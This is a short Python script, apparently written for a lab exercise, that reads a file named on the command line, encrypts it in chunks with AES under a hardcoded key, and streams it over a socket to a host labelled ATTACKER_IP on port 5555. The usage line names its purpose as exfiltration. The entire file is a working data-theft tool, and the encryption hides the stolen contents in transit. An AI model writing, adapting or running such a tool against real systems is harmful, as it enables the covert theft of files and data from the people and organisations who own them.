import socket
import sys
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

KEY = b'Sixteen byte key'
BLOCK_SIZE = 16
ATTACKER_IP = "192.168.56.129"
ATTACKER_PORT = 5555

def encrypt_data(data):
    cipher = AES.new(KEY, AES.MODE_CBC, iv=KEY)
    encrypted = cipher.encrypt(pad(data, BLOCK_SIZE))
    return base64.b64encode(encrypted)

def send_file(filepath):
    s = socket.socket()
    s.connect((ATTACKER_IP, ATTACKER_PORT))
    filename = filepath.split("/")[-1]
    s.send(filename.encode())

    with open(filepath, "rb") as f:
        while True:
            chunk = f.read(4096)
            if not chunk:
                break
            encrypted_chunk = encrypt_data(chunk)
            s.sendall(encrypted_chunk + b"\n")  # Delimiter for chunks

    s.close()

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python3 {sys.argv[0]} <file_to_exfiltrate>")
        sys.exit(1)
    send_file(sys.argv[1])
